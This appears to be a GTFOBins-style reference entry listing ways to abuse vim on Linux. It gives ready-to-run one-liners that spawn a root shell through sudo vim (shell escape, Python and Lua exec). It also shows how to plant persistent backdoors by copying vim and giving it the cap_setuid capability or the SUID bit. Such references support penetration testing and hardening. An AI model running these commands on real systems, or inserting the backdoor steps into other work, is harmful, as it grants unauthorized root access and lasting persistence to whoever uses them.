***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo vim -c ':!/bin/sh'
    * This requires that vim is compiled with Python support. Prepend :py3 for
      Python 3.
      sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec
      sh")'
    * This requires that vim is compiled with Lua support.
      sudo vim -c ':lua os.execute("reset; exec sh")'
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * This requires that vim is compiled with Python support. Prepend :py3 for
      Python 3.
      cp $(which vim) .
      sudo setcap cap_setuid+ep vim

      ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c",
      "reset; exec sh")'
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * This requires that vim is compiled with Lua support.
      sudo sh -c 'cp $(which vim) .; chmod +s ./vim'

      ./vim -c ':lua os.execute("reset; exec sh")'
